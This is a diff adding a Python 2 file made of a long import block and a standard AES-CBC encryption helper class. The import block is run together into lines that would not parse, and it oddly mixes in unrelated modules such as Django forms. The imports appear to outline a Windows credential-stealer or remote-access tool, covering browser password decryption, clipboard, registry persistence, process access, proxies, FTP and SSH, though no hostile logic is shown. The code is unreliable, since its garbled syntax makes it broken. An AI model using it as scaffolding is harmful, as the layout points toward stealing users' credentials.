@@ -1,0 +1,53 @@
+from os import getenv import sqlite3 import win32crypt from os import 
+path import sys from os import listdir import base64 import hashlib from 
+Crypto import Random from Crypto.Cipher import AES from zipfile import 
+ZipFile import htmlentitydefs import HTMLParser import win32clipboard 
+from re import match from django import forms from django.forms.util 
+import ValidationError from Crypto.Hash import SHA256 import zlib from 
+urllib2 import urlopen from urllib2 import Request from hashlib import 
+sha256 from thread import start_new_thread from socket import socket 
+from socket import AF_INET from socket import SOCK_STREAM from socket 
+import SOCK_DGRAM from socks import socksocket from socks import 
+PROXY_TYPE_SOCKS5 from win32api import OpenProcess from win32process 
+import EnumProcesses from pyttsx import init from win32con import 
+PROCESS_ALL_ACCESS from win32process import GetModuleFileNameEx from 
+urllib2 import urlopen as urlopen2 from urllib2 import Request from 
+urllib2 import urlparse from sys import argv from sys import stdout from 
+time import sleep from platform import system from platform import 
+version from ssl import wrap_socket from os import sep from ftplib 
+import FTP from shutil import copyfile from platform import release from 
+os import remove from os import environ from multiprocessing import 
+cpu_count from os import makedirs from shutil import rmtree from os 
+import startfile from _winreg import * from ctypes import sizeof from os 
+import walk from ctypes import c_voidp from string import letters import 
+pythoncom from os.path import join from string import digits from random 
+import randrange from random import seed from random import choice from 
+urllib import urlopen from urllib import urlencode from urllib import 
+urlretrieve from threading import Thread from getpass import getuser 
+from uuid import uuid1 from _winreg import ConnectRegistry, REG_SZ, 
+SetValueEx, KEY_WRITE, KEY_READ, QueryInfoKey, EnumValue, 
+HKEY_CURRENT_USER, OpenKey, HKEY_LOCAL_MACHINE, KEY_ALL_ACCESS, 
+DeleteValue from win32com.client import GetObject from paramiko import 
+SSHClient from paramiko import AutoAddPolicy from base64 import 
+b64encode from subprocess import Popen from base64 import b64decode from 
+os import chdir import wmi class AESCipher(object):
+    def __init__(self, key):
+        self.bs = 32
+        self.key = hashlib.sha256(key.encode()).digest()
+    def encrypt(self, raw):
+        raw = self._pad(raw)
+        iv = Random.new().read(AES.block_size)
+        cipher = AES.new(self.key, AES.MODE_CBC, iv)
+        return base64.b64encode(iv + cipher.encrypt(raw))
+    def decrypt(self, enc):
+        enc = base64.b64decode(enc)
+        iv = enc[:AES.block_size]
+        cipher = AES.new(self.key, AES.MODE_CBC, iv)
+        return 
+self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')
+    def _pad(self, s):
+        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % 
+self.bs)
+    @staticmethod
+    def _unpad(s):
+        return s[:-ord(s[len(s)-1:])]
